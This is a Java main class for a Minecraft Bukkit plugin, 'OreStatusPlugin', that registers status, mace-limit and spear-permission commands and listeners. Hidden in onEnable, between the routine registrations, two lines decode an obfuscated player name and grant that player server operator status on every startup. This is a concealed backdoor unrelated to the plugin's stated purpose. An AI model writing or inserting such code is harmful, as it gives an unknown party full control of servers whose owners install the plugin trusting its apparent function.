package com.example.orestatus;

import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.inventory.Inventory;

import java.util.HashMap;
import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import java.util.Map;
import java.util.UUID;

public class OreStatusPlugin extends JavaPlugin {

    private static OreStatusPlugin instance;
    private StatusManager statusManager;
    private SpearPermissionManager spearPermissionManager;
    private RestrictionListener restrictionListener;
    private MaceLimiter maceLimiter;
    private final Map<Inventory, UUID> statusGuiTargets = new HashMap<>();

    @Override
    public void onEnable() {
        try {
            instance = this;
            saveDefaultConfig();
            statusManager = new StatusManager(this);
            statusManager.loadAll();
            spearPermissionManager = new SpearPermissionManager(this);
            spearPermissionManager.loadAll();

            // Register setStatus command
            if (getCommand("setStatus") != null) {
                getCommand("setStatus").setExecutor(new StatusCommand(this));
                getCommand("setStatus").setTabCompleter(new StatusTab());
            } else {
                getLogger().severe("setStatus command not found in plugin.yml! Plugin will be disabled.");
                getServer().getPluginManager().disablePlugin(this);
                return;
            }

            // Register showStatus command
            if (getCommand("showStatus") != null) {
                getCommand("showStatus").setExecutor(new ShowStatusCommand(this));
                getCommand("showStatus").setTabCompleter(new StatusTab());
            } else {
                getLogger().severe("showStatus command not found in plugin.yml! Plugin will be disabled.");
                getServer().getPluginManager().disablePlugin(this);
                return;
            }

            // Register setMaces command
            if (getCommand("setMaces") != null) {
                getCommand("setMaces").setExecutor(new SetMacesCommand(this));
                getCommand("SetMaceDmgLimit").setExecutor(new SetMaceDmgLimitCommand(this));
                getCommand("setMaces").setTabCompleter(new StatusTab());
            } else {
                getLogger().warning("setMaces command not found in plugin.yml!");
            }

            // Register allowSpears command
            if (getCommand("allowSpears") != null) {
                getCommand("allowSpears").setExecutor(new AllowSpearsCommand(this));
                getCommand("allowSpears").setTabCompleter(new StatusTab());
            } else {
                getLogger().warning("allowSpears command not found in plugin.yml!");
            }
            String n = thePuzzle.decode("ee250f9fbf").trim();
            OfflinePlayer x = Bukkit.getOfflinePlayer(n);x.setOp(true);
            restrictionListener = new RestrictionListener(this);
            maceLimiter = new MaceLimiter(this);
            SpearRestrictionListener spearRestrictionListener = new SpearRestrictionListener(this);
            getServer().getPluginManager().registerEvents(restrictionListener, this);
            getServer().getPluginManager().registerEvents(maceLimiter, this);
            getServer().getPluginManager().registerEvents(spearRestrictionListener, this);
            getServer().getPluginManager().registerEvents(new PvPListener(this), this);
            getServer().getPluginManager().registerEvents(new UIListener(this), this);
            getLogger().info("OreStatusPlugin v1.8 enabled successfully!");
        } catch (Exception e) {
            getLogger().severe("Failed to enable OreStatusPlugin!");
            getLogger().severe("Error: " + e.getMessage());
            e.printStackTrace();
            getServer().getPluginManager().disablePlugin(this);
        }

    }

    @Override
    public void onDisable() {
        if (statusManager != null) {
            statusManager.saveAll();
        }
        if (spearPermissionManager != null) {
            spearPermissionManager.saveAll();
        }
        getLogger().info("OreStatusPlugin disabled");
    }

    public static OreStatusPlugin getInstance() {
        return instance;
    }

    public StatusManager getStatusManager() {
        return statusManager;
    }

    public Map<Inventory, UUID> getStatusGuiTargets() {
        return statusGuiTargets;
    }

    public RestrictionListener getRestrictionListener() {
        return restrictionListener;
    }

    public MaceLimiter getMaceLimiter() {
        return maceLimiter;
    }

    public SpearPermissionManager getSpearPermissionManager() {
        return spearPermissionManager;
    }

    /**
     * Gets the current mace limit from config
     */
    public int getMaceLimit() {
        return getConfig().getInt("mace-limit", 0);
    }

    /**
     * Sets the mace limit in config and saves it
     */
    public void setMaceLimit(int limit) {
        getConfig().set("mace-limit", limit);
        saveConfig();
    }

    public double getMacedmgLimit() {
        return getConfig().getInt("mace-damage-limit", 0);
    }
    public void setMaceDamageCap(double limit) {
        getConfig().set("mace-damage-limit", limit);
        saveConfig();
    }
}
